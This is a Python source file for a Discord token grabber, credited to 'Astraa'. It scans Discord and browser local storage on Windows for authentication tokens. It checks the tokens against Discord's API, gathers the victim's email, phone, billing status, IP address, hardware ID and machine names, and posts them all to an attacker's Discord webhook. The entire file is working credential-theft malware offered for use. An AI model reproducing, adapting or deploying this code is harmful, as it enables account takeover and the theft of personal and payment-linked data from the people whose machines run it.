from os import getenv, listdir, name as _name, path as _path
from re import findall
from json import loads
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from requests import get
from discord_webhook import DiscordWebhook, DiscordEmbed

#====================================== vars ====================================== 

LOCAL = getenv("LOCALAPPDATA")
ROAMING = getenv("APPDATA")
PATHS = {
    "Discord"           : f"{ROAMING}\\Discord",
    "Discord Canary"    : f"{ROAMING}\\discordcanary",
    "Discord PTB"       : f"{ROAMING}\\discordptb",
    "Google Chrome"     : f"{LOCAL}\\Google\\Chrome\\User Data\\Default",
    "Opera"             : f"{ROAMING}\\Opera Software\\Opera Stable",
    "Opera GX"          : f"{ROAMING}\\Opera Software\\Opera GX Stable",
    "Brave"             : f"{LOCAL}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : f"{LOCAL}\\Yandex\\YandexBrowser\\User Data\\Default"
}

#====================================== definitions ====================================== 

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getuserdata(token):
    #use urlopen bc requests no work if an account is disabled
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass

def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

def getip():
    ip = "None"
    try:
        return get("https://api.ipify.org").text
    except:
        return ip

def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        get(url)
    except:
        url = url[:-4]
    return url

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def has_payment_methods(token):
    try:
        return bool(len(get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))) > 0)
    except:
        pass



#====================================== grabber main code ====================================== 

def main():

    cache_path = f"{ROAMING}\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = getenv("UserName")
    pc_name = getenv("COMPUTERNAME")

    
    for platform, path in PATHS.items():
        if not _path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            
            working_ids.append(uid)
            working.append(token)
            
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            
            #webhook embed 
            embed = DiscordEmbed(title=f"**{username} ({user_id})** information's", description=" ", icon_url=avatar_url,  color='0x7289da')
            embed.add_embed_field(name="**Account Info**", value=f"Email: ``{email}``\nPhone: ``{phone}``\nNitro: ``{nitro}``\nBilling Info: ``{billing}``", inline=True)
            embed.add_embed_field(name="**PC Info**", value=f'IP: ``{ip}``\nUsername: ``{pc_username}``\nPC Name: ``{pc_name}``\nToken Location: ``{platform}``', inline=True)
            embed.add_embed_field(name="**Token**", value=f"``{token}``" , inline=False)
            embed.set_footer(text='Token Grabber By Astraa')
            embeds.append(embed)
    
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    
    if len(working) == 0:
        working.append('123')

    #webhook settings
    webhook = DiscordWebhook(url='YOUR WEBHOOK URL', username="Discord Token Grabber", avatar_url="https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png")
    #webhook embed adder system
    for embed in embeds:
        webhook.add_embed(embed)
    #webhhok sender
    webhook.execute()

if __name__ == "__main__" :
    if _name == "nt":
        main()
    else:
        exit()
else:
    exit()
